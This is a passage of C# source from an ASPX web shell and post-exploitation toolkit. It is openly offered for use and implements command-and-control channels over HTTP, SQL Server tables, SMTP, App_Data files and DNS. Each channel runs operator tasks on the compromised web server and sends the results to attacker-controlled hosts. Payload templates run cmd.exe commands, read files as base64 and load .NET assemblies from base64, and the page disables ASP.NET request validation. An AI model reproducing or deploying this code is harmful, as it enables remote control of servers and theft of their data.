                        stream.Write(outBytes, 0, outBytes.Length);
                    }
                    done:;
                }
            }
            sb.AppendLine("[+] Session ended.");
        }
        catch (Exception ex)
        {
            sb.AppendLine("[-] " + ex.GetType().Name + ": " + ex.Message);
            if (ex.InnerException != null)
                sb.AppendLine("    Inner: " + ex.InnerException.Message);
        }
        return sb.ToString();
    }

    // ===========================================================
    // T2: HTTP Beacon C2 (High Trust)
    //  @zux03a  High / Medium 
    // Uses WebClient/HttpWebRequest — allowed under High Trust.
    // Beacons to external C2 for tasks, sends results back.
    // All task execution is managed-only (no Process.Start).
    //
    // Usage: args = "http://c2server:port"      (beacon loop)
    //        args = "http://c2server:port|once"  (single poll)
    //
    // Protocol:
    //   GET  /task   -> command string or "NOP"
    //   POST /result -> task output
    // ===========================================================

    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private string TechniqueHttpBeacon(string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== T2: HTTP Beacon C2 (High Trust) ===");
        sb.AppendLine();

        if (string.IsNullOrEmpty(args))
        {
            sb.AppendLine("Usage: provide C2 URL in args");
            sb.AppendLine("  Loop:        http://10.0.0.5:8080");
            sb.AppendLine("  Single poll: http://10.0.0.5:8080|once");
            sb.AppendLine();
            sb.AppendLine("[*] Probing HTTP outbound...");
            try
            {
                new System.Net.WebPermission(System.Security.Permissions.PermissionState.Unrestricted).Demand();
                sb.AppendLine("[+] WebPermission: ALLOWED");
            }
            catch { sb.AppendLine("[-] WebPermission: DENIED (need High Trust)"); }
            return sb.ToString();
        }

        string c2Url = args.Trim();
        bool singlePoll = false;
        if (c2Url.Contains("|"))
        {
            string[] split = c2Url.Split(new char[] { '|' }, 2);
            c2Url = split[0].Trim();
            singlePoll = split[1].Trim().ToLower() == "once";
        }
        c2Url = c2Url.TrimEnd('/');

        sb.AppendLine("[*] C2: " + c2Url + " (" + (singlePoll ? "once" : "loop") + ")");

        try
        {
            var wc = new System.Net.WebClient();
            wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

            // Register
            string reg = SafeGet(() => Environment.MachineName, "?") + "|"
                + SafeGet(() => Environment.UserName, "?") + "|"
                + SafeGet(() => Environment.OSVersion.ToString(), "?");
            try { wc.UploadString(c2Url + "/register", reg); sb.AppendLine("[+] Registered"); }
            catch { sb.AppendLine("[*] No /register endpoint (OK)"); }

            int maxIter = singlePoll ? 1 : 300;
            int iter = 0;

            while (iter < maxIter)
            {
                iter++;
                string task = "";
                try { task = wc.DownloadString(c2Url + "/task").Trim(); }
                catch (Exception ex)
                {
                    if (singlePoll) { sb.AppendLine("[-] Poll failed: " + ex.Message); break; }
                    System.Threading.Thread.Sleep(2000);
                    continue;
                }

                if (string.IsNullOrEmpty(task) || task == "NOP" || task == "nop")
                {
                    if (singlePoll) { sb.AppendLine("[*] No task."); break; }
                    System.Threading.Thread.Sleep(1000);
                    continue;
                }

                if (task.ToLower() == "exit" || task.ToLower() == "die")
                {
                    sb.AppendLine("[*] Exit command."); break;
                }

                sb.AppendLine("[*] Task: " + task);
                string result = RunManagedTask(task);

                try { wc.UploadString(c2Url + "/result", result); sb.AppendLine("[+] Sent " + result.Length + "b"); }
                catch (Exception ex) { sb.AppendLine("[-] Send: " + ex.Message); }

                if (singlePoll) break;
                System.Threading.Thread.Sleep(1000);
            }
            sb.AppendLine("[*] Done after " + iter + " iterations.");
        }
        catch (Exception ex)
        {
            sb.AppendLine("[-] " + ex.GetType().Name + ": " + ex.Message);
        }
        return sb.ToString();
    }

    // ===========================================================
    // T3: SQL C2 Dead Drop (High AND Medium Trust)
    //  @zux03a  High / Medium 
    // SqlClient is allowed at BOTH trust levels. Uses SQL Server
    // tables as a command/response dead drop.
    //
    // This is one of only TWO outbound channels at Medium Trust
    // (the other being SMTP).
    //
    // Operator posts tasks via SSMS/sqlcmd, agent polls + executes.
    //
    // Usage: args = "connstring"          (setup)
    //        args = "connstring|poll"     (one poll)
    //        args = "connstring|loop"     (beacon)
    //        args = "connstring|cleanup"  (drop)
    // ===========================================================

    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private string TechniqueSqlC2(string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== T3: SQL C2 Dead Drop (High/Medium Trust) ===");
        sb.AppendLine();

        if (string.IsNullOrEmpty(args))
        {
            sb.AppendLine("by @zux0x3a"); 
            sb.AppendLine("Usage: provide SQL connection string in args");
            sb.AppendLine("  Setup:   Server=db;Database=tempdb;Integrated Security=true");
            sb.AppendLine("  Poll:    <connstring>|poll");
            sb.AppendLine("  Loop:    <connstring>|loop");
            sb.AppendLine("  Cleanup: <connstring>|cleanup");
            sb.AppendLine();
            sb.AppendLine("Operator workflow:");
            sb.AppendLine("  INSERT INTO __c2_tasks(cmd) VALUES('sysinfo')");
            sb.AppendLine("  INSERT INTO __c2_tasks(cmd) VALUES('ls C:\\inetpub')");
            sb.AppendLine("  INSERT INTO __c2_tasks(cmd) VALUES('cat C:\\web.config')");
            sb.AppendLine("  INSERT INTO __c2_tasks(cmd) VALUES('asm <base64dll>')");
            sb.AppendLine("  SELECT r.*, t.cmd FROM __c2_results r JOIN __c2_tasks t ON r.task_id=t.id ORDER BY r.id DESC");
            sb.AppendLine();
            sb.AppendLine("[*] Probing SQL client...");
            try
            {
                Type t = Type.GetType("System.Data.SqlClient.SqlConnection, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
                sb.AppendLine(t != null ? "[+] SqlConnection available" : "[-] SqlConnection not found");
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
            return sb.ToString();
        }

        string connStr = args.Trim();
        string mode = "setup";

        string[] knownModes = new string[] { "poll", "loop", "cleanup" }; //read the banner for more info!
        int lastPipe = connStr.LastIndexOf('|');
        if (lastPipe > 0)
        {
            string possibleMode = connStr.Substring(lastPipe + 1).Trim().ToLower();
            foreach (string km in knownModes)
            {
                if (possibleMode == km) { mode = km; connStr = connStr.Substring(0, lastPipe).Trim(); break; }
            }
        }

        sb.AppendLine("[*] Mode: " + mode);

        try
        {
            Type sqlConnType = Type.GetType("System.Data.SqlClient.SqlConnection, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
            Type sqlCmdType = Type.GetType("System.Data.SqlClient.SqlCommand, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");

            if (sqlConnType == null || sqlCmdType == null)
            {
                sb.AppendLine("[-] System.Data.SqlClient not available.");
                return sb.ToString();
            }

            using (IDisposable conn = (IDisposable)Activator.CreateInstance(sqlConnType, new object[] { connStr }))
            {
                sqlConnType.GetMethod("Open").Invoke(conn, null);
                sb.AppendLine("[+] Connected to SQL Server");

                Action<string> execNQ = delegate(string sql)
                {
                    using (IDisposable cmd = (IDisposable)Activator.CreateInstance(sqlCmdType, new object[] { sql, conn }))
                    { sqlCmdType.GetMethod("ExecuteNonQuery").Invoke(cmd, null); }
                };

                Func<string, object> execSc = delegate(string sql)
                {
                    using (IDisposable cmd = (IDisposable)Activator.CreateInstance(sqlCmdType, new object[] { sql, conn }))
                    { return sqlCmdType.GetMethod("ExecuteScalar").Invoke(cmd, null); }
                };

                if (mode == "setup")
                {
                    execNQ("IF OBJECT_ID('__c2_tasks') IS NULL CREATE TABLE __c2_tasks(id INT IDENTITY PRIMARY KEY, cmd NVARCHAR(MAX), created DATETIME DEFAULT GETDATE(), picked BIT DEFAULT 0)");
                    execNQ("IF OBJECT_ID('__c2_results') IS NULL CREATE TABLE __c2_results(id INT IDENTITY PRIMARY KEY, task_id INT, output NVARCHAR(MAX), created DATETIME DEFAULT GETDATE())");
                    sb.AppendLine("[+] C2 tables ready.");
                    sb.AppendLine("Then use |poll or |loop to start agent.");
                }
                else if (mode == "cleanup")
                {
                    execNQ("IF OBJECT_ID('__c2_results') IS NOT NULL DROP TABLE __c2_results");
                    execNQ("IF OBJECT_ID('__c2_tasks') IS NOT NULL DROP TABLE __c2_tasks");
                    sb.AppendLine("[+] Tables dropped.");
                }
                else
                {
                    int maxIter = (mode == "loop") ? 300 : 1;
                    int iter = 0;

                    while (iter < maxIter)
                    {
                        iter++;
                        object taskIdObj = execSc("SELECT TOP 1 id FROM __c2_tasks WHERE picked=0 ORDER BY id ASC");
                        if (taskIdObj == null || taskIdObj is DBNull)
                        {
                            if (mode == "poll") { sb.AppendLine("[*] No tasks."); break; }
                            System.Threading.Thread.Sleep(2000);
                            continue;
                        }

                        int taskId = Convert.ToInt32(taskIdObj);
                        execNQ("UPDATE __c2_tasks SET picked=1 WHERE id=" + taskId);
                        object cmdObj = execSc("SELECT cmd FROM __c2_tasks WHERE id=" + taskId);
                        string taskCmd = (cmdObj != null) ? cmdObj.ToString() : "";

                        if (taskCmd == "__EXIT__")
                        {
                            execNQ("INSERT INTO __c2_results(task_id, output) VALUES(" + taskId + ", 'Agent exited')");
                            sb.AppendLine("[*] Exit signal."); break;
                        }

                        sb.AppendLine("[*] Task #" + taskId + ": " + taskCmd);
                        string result = RunManagedTask(taskCmd);

                        string safe = result.Replace("'", "''");
                        if (safe.Length > 32000) safe = safe.Substring(0, 32000) + "...(truncated)";
                        execNQ("INSERT INTO __c2_results(task_id, output) VALUES(" + taskId + ", '" + safe + "')");
                        sb.AppendLine("[+] Result stored (" + result.Length + "b)");

                        if (mode == "poll") break;
                        System.Threading.Thread.Sleep(1000);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            sb.AppendLine("[-] " + ex.GetType().Name + ": " + ex.Message);
            if (ex.InnerException != null)
                sb.AppendLine("    Inner: " + ex.InnerException.Message);
        }
        return sb.ToString();
    }

    // ===========================================================
    // T4: SMTP Exfiltration (High AND Medium Trust)
    //  @zux03a  High / Medium 
    // SmtpClient is allowed at BOTH trust levels (Medium grants
    // SmtpPermission with ConnectAccess).
    //
    // Executes a managed task and emails the output.
    // At Medium Trust, this is one of only TWO outbound channels.
    //
    // Usage: smtp://relay:25|from@x|to@x|sysinfo
    //        smtp://server:587|from@x|to@x|user|pass|ls C:\
    // ===========================================================

    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private string TechniqueSmtpExfil(string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== T4: SMTP Exfiltration (High/Medium Trust) ===");
        sb.AppendLine();

        if (string.IsNullOrEmpty(args))
        {
            sb.AppendLine("by @zux0x3a"); 
            sb.AppendLine("Usage: pipe-separated args:");
            sb.AppendLine("  smtp://relay:25|from@corp.com|to@attacker.com|sysinfo");
            sb.AppendLine("  smtp://smtp.gmail.com:587|from|to|user|pass|ls C:\\inetpub");
            sb.AppendLine();
            sb.AppendLine("Available tasks: sysinfo, ls <path>, cat <file>,");
            sb.AppendLine("  dl <file>, write path|data, asm <base64>, env, pwd");
            sb.AppendLine();
            sb.AppendLine("[*] Probing SMTP...");
            try
            {
                Type smtpType = typeof(System.Net.Mail.SmtpClient);
                sb.AppendLine("[+] SmtpClient: " + smtpType.FullName);
            }
            catch { sb.AppendLine("[-] SmtpClient not available"); }
            return sb.ToString();
        }

        string[] p = args.Split(new char[] { '|' });
        if (p.Length < 4)
        {
            sb.AppendLine("[-] Need: smtp://server:port|from|to|task");
            return sb.ToString();
        }

        string smtpUri = p[0].Trim();
        string from = p[1].Trim();
        string to = p[2].Trim();
        string user = null, pass = null;
        string task;

        if (p.Length >= 6)
        {
            user = p[3].Trim();
            pass = p[4].Trim();
            task = p[5].Trim();
        }
        else
        {
            task = p[3].Trim();
        }

        string smtpHost = smtpUri.Replace("smtp://", "").Replace("SMTP://", "");
        int smtpPort = 25;
        if (smtpHost.Contains(":"))
        {
            string[] hp = smtpHost.Split(':');
            smtpHost = hp[0];
            int.TryParse(hp[1], out smtpPort);
        }

        sb.AppendLine("[*] SMTP: " + smtpHost + ":" + smtpPort);
        sb.AppendLine("[*] Task: " + task);

        string output = RunManagedTask(task);

        try
        {
            var smtp = new System.Net.Mail.SmtpClient(smtpHost, smtpPort);
            if (user != null && pass != null)
            {
                smtp.Credentials = new System.Net.NetworkCredential(user, pass);
                smtp.EnableSsl = (smtpPort == 587 || smtpPort == 465);
            }
            smtp.Timeout = 15000;

            string subject = "Rpt " + SafeGet(() => Environment.MachineName, "?") + " " + DateTime.Now.ToString("HHmmss");
            var msg = new System.Net.Mail.MailMessage(from, to, subject, output);
            smtp.Send(msg);
            sb.AppendLine("[+] Email sent (" + output.Length + " bytes)");
        }
        catch (Exception ex)
        {
            sb.AppendLine("[-] SMTP: " + ex.GetType().Name + ": " + ex.Message);
            if (ex.InnerException != null)
                sb.AppendLine("    Inner: " + ex.InnerException.Message);
            sb.AppendLine();
            sb.AppendLine("[*] Output (since mail failed):");
            sb.AppendLine(output.Length > 2000 ? output.Substring(0, 2000) + "..." : output);
        }
        return sb.ToString();
    }

    // ===========================================================
    // T5: File-Based C2 Channel (Medium Trust)
    //  @zux03a  High / Medium 
    // Under Medium Trust, file I/O to the app directory works.
    // Uses App_Data as a dead-drop for commands and results.
    //
    // The operator queues commands via the ASPX page, and
    // the 'exec' action runs them. All execution is managed-only.
    //
    // Usage: setup / drop <task> / exec / poll / read <file> / cleanup
    // ===========================================================

    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private string TechniqueFileC2(string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== T5: File-Based C2 (Medium Trust) ===");
        sb.AppendLine();

        string appPath = GetAppPath();
        if (appPath == null) { sb.AppendLine("[-] Cannot determine app path."); return sb.ToString(); }
        string dropZone = Path.Combine(appPath, "App_Data");

        if (string.IsNullOrEmpty(args))
        {
            sb.AppendLine("by @zux0x3a"); 
            sb.AppendLine("Usage:");
            sb.AppendLine("  setup            - create App_Data drop zone");
            sb.AppendLine("  drop <task>      - queue a task (sysinfo, ls, cat, dl, asm, etc.)");
            sb.AppendLine("  exec             - execute all pending tasks");
            sb.AppendLine("  poll             - check for results");
            sb.AppendLine("  read <filename>  - read a result file");
            sb.AppendLine("  cleanup          - remove all C2 files");
            return sb.ToString();
        }

        string cmd = args.Trim();
        string lower = cmd.ToLower();

        if (lower == "setup")
        {
            try
            {
                if (!Directory.Exists(dropZone)) Directory.CreateDirectory(dropZone);
                string testPath = Path.Combine(dropZone, "_probe.tmp");
                File.WriteAllText(testPath, "ok");
                File.Delete(testPath);
                sb.AppendLine("[+] Drop zone ready: " + dropZone);
            }
            catch (Exception ex) { sb.AppendLine("[-] Setup failed: " + ex.Message); }
        }
        else if (lower.StartsWith("drop "))
        {
            string task = cmd.Substring(5).Trim();
            try
            {
                if (!Directory.Exists(dropZone)) Directory.CreateDirectory(dropZone);
                string taskId = DateTime.Now.ToString("yyyyMMdd_HHmmss_fff");
                string taskFile = Path.Combine(dropZone, "_cmd_" + taskId + ".txt");
                File.WriteAllText(taskFile, task);
                sb.AppendLine("[+] Queued: " + Path.GetFileName(taskFile));
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
        }
        else if (lower == "exec")
        {
            try
            {
                string[] cmdFiles = Directory.GetFiles(dropZone, "_cmd_*.txt");
                if (cmdFiles.Length == 0) { sb.AppendLine("[*] No pending tasks."); return sb.ToString(); }
                Array.Sort(cmdFiles);
                sb.AppendLine("[*] Found " + cmdFiles.Length + " task(s).");

                foreach (string cmdFile in cmdFiles)
                {
                    string task = File.ReadAllText(cmdFile).Trim();
                    string taskId = Path.GetFileNameWithoutExtension(cmdFile).Replace("_cmd_", "");
                    sb.AppendLine("[*] " + task);

                    string result = RunManagedTask(task);

                    string resFile = Path.Combine(dropZone, "_res_" + taskId + ".txt");
                    File.WriteAllText(resFile, result);
                    sb.AppendLine("[+] " + Path.GetFileName(resFile) + " (" + result.Length + "b)");
                    File.Delete(cmdFile);
                }
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
        }
        else if (lower == "poll")
        {
            try
            {
                string[] cmds = Directory.GetFiles(dropZone, "_cmd_*.txt");
                string[] res = Directory.GetFiles(dropZone, "_res_*.txt");
                sb.AppendLine("[*] Pending: " + cmds.Length + "  Results: " + res.Length);
                if (res.Length > 0)
                {
                    Array.Sort(res);
                    foreach (string r in res)
                    {
                        FileInfo fi = new FileInfo(r);
                        sb.AppendLine("  " + fi.Name + " (" + fi.Length + "b)");
                    }
                }
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
        }
        else if (lower.StartsWith("read "))
        {
            string fname = cmd.Substring(5).Trim();
            try
            {
                string fp = Path.IsPathRooted(fname) ? fname : Path.Combine(dropZone, fname);
                sb.AppendLine(File.ReadAllText(fp));
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
        }
        else if (lower == "cleanup")
        {
            try
            {
                int ct = 0;
                foreach (string f in Directory.GetFiles(dropZone, "_cmd_*")) { File.Delete(f); ct++; }
                foreach (string f in Directory.GetFiles(dropZone, "_res_*")) { File.Delete(f); ct++; }
                foreach (string f in Directory.GetFiles(dropZone, "_probe*")) { File.Delete(f); ct++; }
                sb.AppendLine("[+] Cleaned " + ct + " files.");
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
        }
        else
        {
            sb.AppendLine("[-] Unknown: " + cmd);
            sb.AppendLine("    Use: setup, drop, exec, poll, read, cleanup");
        }
        return sb.ToString();
    }

    // ===========================================================
    // T6: DNS Exfiltration (High Trust)
    //
    // System.Net.Dns is allowed under High Trust. Encodes data
    // into DNS subdomain queries for stealthy exfiltration.
    //
    // Usage: domain.com           (probe)
    //        domain.com|sysinfo   (exec + exfil)
    //        domain.com|cat C:\x  (file exfil)
    // ===========================================================

    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private string TechniqueDnsExfil(string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== T6: DNS Exfiltration (High Trust) ===");
        sb.AppendLine();

        if (string.IsNullOrEmpty(args))
        {
            sb.AppendLine("Usage: domain.com              (probe)");
            sb.AppendLine("       domain.com|sysinfo      (exec+exfil)");
            sb.AppendLine("       domain.com|cat C:\\x     (file exfil)");
            sb.AppendLine();
            sb.AppendLine("[*] Probing DNS...");
            try
            {
                new System.Net.DnsPermission(System.Security.Permissions.PermissionState.Unrestricted).Demand();
                sb.AppendLine("[+] DnsPermission: ALLOWED");
            }
            catch { sb.AppendLine("[-] DnsPermission: DENIED"); }
            return sb.ToString();
        }

        string baseDomain = args.Trim();
        string task = null;
        if (baseDomain.Contains("|"))
        {
            string[] split = baseDomain.Split(new char[] { '|' }, 2);
            baseDomain = split[0].Trim();
            task = split[1].Trim();
        }

        if (task == null)
        {
            sb.AppendLine("[*] Probe: probe." + baseDomain);
            try { System.Net.Dns.GetHostEntry("probe." + baseDomain); }
            catch (System.Net.Sockets.SocketException) { sb.AppendLine("[+] Sent (NXDOMAIN = normal)"); }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }
            return sb.ToString();
        }

        string data = RunManagedTask(task);
        sb.AppendLine("[*] Data: " + data.Length + " bytes");

        string hex = BitConverter.ToString(Encoding.UTF8.GetBytes(data)).Replace("-", "").ToLower();
        int chunkSize = 60;
        int total = (hex.Length + chunkSize - 1) / chunkSize;
        sb.AppendLine("[*] Sending " + total + " DNS queries...");

        int sent = 0;
        for (int i = 0; i < hex.Length; i += chunkSize)
        {
            int len = Math.Min(chunkSize, hex.Length - i);
            string chunk = hex.Substring(i, len);
            string query = sent.ToString("D4") + "." + chunk + "." + baseDomain;
            try { System.Net.Dns.GetHostEntry(query); } catch { }
            sent++;
            if (sent % 10 == 0) System.Threading.Thread.Sleep(100);
        }
        try { System.Net.Dns.GetHostEntry("end." + total + "." + baseDomain); } catch { }

        sb.AppendLine("[+] Sent " + sent + "/" + total + " chunks.");
        return sb.ToString();
    }








    // Pre-built payloads (convenience templates)
    // you can strip out what you do not need, this is a testing proof of concept 
    // ============================================================

    private static readonly Dictionary<string, string[]> Payloads = new Dictionary<string, string[]>()
    {
        { "sysinfo", new string[] {
            "System Enumeration",
@"public string Go()
{
    StringBuilder sb = new StringBuilder();
    sb.AppendLine(""=== Environment =="");
    sb.AppendLine(""Computer: "" + Environment.MachineName);
    string sep = new string(new char[]{ (char)92 });
    sb.AppendLine(""User: "" + Environment.UserDomainName + sep + Environment.UserName);
    sb.AppendLine(""OS: "" + Environment.OSVersion);
    sb.AppendLine(""CLR: "" + Environment.Version);
    sb.AppendLine(""x64 Process: "" + (IntPtr.Size == 8));
    sb.AppendLine(""Processors: "" + Environment.ProcessorCount);
    sb.AppendLine(""Directory: "" + Environment.CurrentDirectory);
    sb.AppendLine();
    sb.AppendLine(""=== Process =="");
    var p = Process.GetCurrentProcess();
    sb.AppendLine(""PID: "" + p.Id);
    sb.AppendLine(""Name: "" + p.ProcessName);
    sb.AppendLine(""Memory: "" + (p.WorkingSet64 / 1024 / 1024) + "" MB"");
    sb.AppendLine();
    sb.AppendLine(""=== Network =="");
    sb.AppendLine(""Hostname: "" + System.Net.Dns.GetHostName());
    var addrs = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName());
    foreach (var a in addrs)
        sb.AppendLine(""  "" + a);
    sb.AppendLine();
    sb.AppendLine(""=== Drives =="");
    foreach (var d in DriveInfo.GetDrives())
    {
        try { sb.AppendLine(""  "" + d.Name + "" "" + d.DriveType + "" "" + d.VolumeLabel + "" "" + (d.TotalSize/1024/1024/1024) + ""GB""); }
        catch { sb.AppendLine(""  "" + d.Name + "" (unavailable)""); }
    }
    return sb.ToString();
}"
        }},

        { "cmd", new string[] {
            "Command Execution (reads from 'args' parameter)",
@"public string Go()
{
    // The command is passed via args -- we read it from the XSLT input
    // Since we can't easily pass params through XSLT, we use an env trick:
    // The ASPX page sets an environment variable before calling us.
    string cmd = Environment.GetEnvironmentVariable(""_XSLT_ARG"");
    if (string.IsNullOrEmpty(cmd))
        return ""No command provided. Set the args field."";

    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = ""cmd.exe"";
    psi.Arguments = ""/c "" + cmd;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;

    using (Process p = Process.Start(psi))
    {
        string stdout = p.StandardOutput.ReadToEnd();
        string stderr = p.StandardError.ReadToEnd();
        p.WaitForExit(15000);
        return stdout + stderr;
    }
}"
        }},

        { "ls", new string[] {
            "Directory Listing (path from 'args')",
@"public string Go()
{
    string path = Environment.GetEnvironmentVariable(""_XSLT_ARG"");
    if (string.IsNullOrEmpty(path)) path = ""C:"" + new string(new char[]{ (char)92 });

    StringBuilder sb = new StringBuilder();
    sb.AppendLine(""Listing: "" + path);
    sb.AppendLine();

    try
    {
        foreach (string d in Directory.GetDirectories(path))
        {
            var di = new DirectoryInfo(d);
            sb.AppendLine(string.Format("" {0,-20} {1,12} {2}"",
                di.LastWriteTime.ToString(""yyyy-MM-dd HH:mm""), ""<DIR>"", di.Name));
        }
        foreach (string f in Directory.GetFiles(path))
        {
            var fi = new FileInfo(f);
            sb.AppendLine(string.Format("" {0,-20} {1,12} {2}"",
                fi.LastWriteTime.ToString(""yyyy-MM-dd HH:mm""), fi.Length.ToString(""N0""), fi.Name));
        }
    }
    catch (Exception ex) { sb.AppendLine(""Error: "" + ex.Message); }

    return sb.ToString();
}"
        }},

        { "download", new string[] {
            "Read File (path from 'args', returns base64)",
@"public string Go()
{
    string path = Environment.GetEnvironmentVariable(""_XSLT_ARG"");
    if (string.IsNullOrEmpty(path))
        return ""No path provided."";

    if (!File.Exists(path))
        return ""File not found: "" + path;

    byte[] data = File.ReadAllBytes(path);
    return ""Size: "" + data.Length + "" bytes\n\n"" + Convert.ToBase64String(data);
}"
        }},

        { "assembly", new string[] {
            "Load .NET Assembly from Base64 (base64 in 'args', calls Run method)",
@"public string Go()
{
    string b64 = Environment.GetEnvironmentVariable(""_XSLT_ARG"");
    if (string.IsNullOrEmpty(b64))
        return ""No assembly data. Paste base64 of .NET DLL in args field."";

    byte[] raw = Convert.FromBase64String(b64);
    Assembly asm = Assembly.Load(raw);

    // Search for a static Run() method in all types
    foreach (Type t in asm.GetExportedTypes())
    {
        MethodInfo mi = t.GetMethod(""Run"",
            BindingFlags.Public | BindingFlags.Static,
            null, Type.EmptyTypes, null);
        if (mi != null)
        {
            object result = mi.Invoke(null, null);
            return result != null ? result.ToString() : ""(Run returned null)"";
        }

        // Also try Run(string)
        mi = t.GetMethod(""Run"",
            BindingFlags.Public | BindingFlags.Static,
            null, new Type[] { typeof(string) }, null);
        if (mi != null)
        {
            object result = mi.Invoke(null, new object[] { """" });
            return result != null ? result.ToString() : ""(Run returned null)"";
        }
    }

    // List all public types and methods if Run not found
    StringBuilder sb = new StringBuilder();
    sb.AppendLine(""No static Run() found. Available types:"");
    foreach (Type t in asm.GetExportedTypes())
    {
        sb.AppendLine(""  "" + t.FullName);
        foreach (MethodInfo mi in t.GetMethods(BindingFlags.Public | BindingFlags.Static))
            sb.AppendLine(""    static "" + mi.ReturnType.Name + "" "" + mi.Name + ""("" +
                string.Join("", "", Array.ConvertAll(mi.GetParameters(), p => p.ParameterType.Name + "" "" + p.Name)) + "")"");
    }
    return sb.ToString();
}"
        }},

        { "pinvoke_test", new string[] {
            "P/Invoke Probe (test unmanaged access from XSLT context)",
@"public string Go()
{
    // This tests whether code compiled by XslCompiledTransform
    // can perform P/Invoke -- even if the hosting page cannot.
    StringBuilder sb = new StringBuilder();

    try
    {
       
        var kernel32 = typeof(object).Assembly; // mscorlib is always loaded

        // Direct test: use System.Runtime.InteropServices
        sb.AppendLine(""Testing P/Invoke from XSLT-compiled assembly..."");

    
        int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
        sb.AppendLine(""PID (managed): "" + pid);

     
        sb.AppendLine(""Attempting SecurityPermission demand..."");
        System.Security.Permissions.SecurityPermission sp = new System.Security.Permissions.SecurityPermission(
            System.Security.Permissions.SecurityPermissionFlag.UnmanagedCode);
        sp.Demand();
        sb.AppendLine(""UnmanagedCode permission: GRANTED"");
        sb.AppendLine();
        sb.AppendLine(""The XSLT-compiled assembly has full unmanaged access."");
        sb.AppendLine(""This means the reflective DLL loader could work from here."");
    }
    catch (System.Security.SecurityException ex)
    {
        sb.AppendLine(""UnmanagedCode permission: DENIED"");
        sb.AppendLine(""  "" + ex.Message);
        sb.AppendLine();
        sb.AppendLine(""CAS restrictions apply to XSLT-compiled code as well."");
        sb.AppendLine(""Use managed payloads (Assembly.Load, Process.Start) instead."");
    }
    catch (Exception ex)
    {
        sb.AppendLine(""Error: "" + ex.GetType().Name + "": "" + ex.Message);
    }

    return sb.ToString();
}"
        }}
    };

 

    protected override void OnInit(EventArgs e)
    {
        // Disable .NET 4.0+ request validation at the page level
        // ValidateRequest="false" alone is insufficient on .NET 4.0+
        // This must happen in OnInit, before form data is processed
        try
        {
            Page.ValidateRequestMode = System.Web.UI.ValidateRequestMode.Disabled;
        }
        catch { }
        base.OnInit(e);
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!ValidateAccess())
            return;

        lblStatus.Text = CheckEnvironment();

        if (!IsPostBack)
        {
            // Populate engine selector
            ddlEngine.Items.Clear();
            ddlEngine.Items.Add(new System.Web.UI.WebControls.ListItem("Auto (best available)", "auto"));
            if (_engineXslt)
                ddlEngine.Items.Add(new System.Web.UI.WebControls.ListItem("XSLT (Full Trust)", "xslt"));
            if (_engineCodeDom)
                ddlEngine.Items.Add(new System.Web.UI.WebControls.ListItem("CodeDom (High Trust)", "codedom"));
            ddlEngine.Items.Add(new System.Web.UI.WebControls.ListItem("Managed (any trust)", "managed"));

            // Populate payload selector
            ddlPayload.Items.Clear();

            // Compilation-based payloads (XSLT / CodeDom)
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("--- Compiled (XSLT/CodeDom) ---", "custom"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Custom Code", "custom"));
            foreach (var kv in Payloads)
            {
                ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem(
                    "  " + kv.Value[0], kv.Key));
            }

            // C2 Channel Techniques (trust-level aware)
            // C2 Channels — managed-only, no Process.Start
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("--- C2 Channels (High Trust — sockets/HTTP/DNS) ---", "t_tcpshell"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  T1: TCP Channel (managed tasks, args: host:port)", "t_tcpshell"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  T2: HTTP Beacon (managed tasks, args: http://c2:port)", "t_httpbeacon"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  T6: DNS Exfiltration (args: domain.com|task)", "t_dns"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("--- C2 Channels (High+Medium Trust — SQL/SMTP) ---", "t_sqlc2"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  T3: SQL Dead Drop C2 (args: connstring|mode)", "t_sqlc2"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  T4: SMTP Exfiltration (args: smtp://srv|from|to|task)", "t_smtp"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("--- C2 Channels (Medium Trust — file-based) ---", "t_filec2"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  T5: File-Based C2 (args: setup/drop/exec/poll)", "t_filec2"));

            // Managed payloads (no compilation)
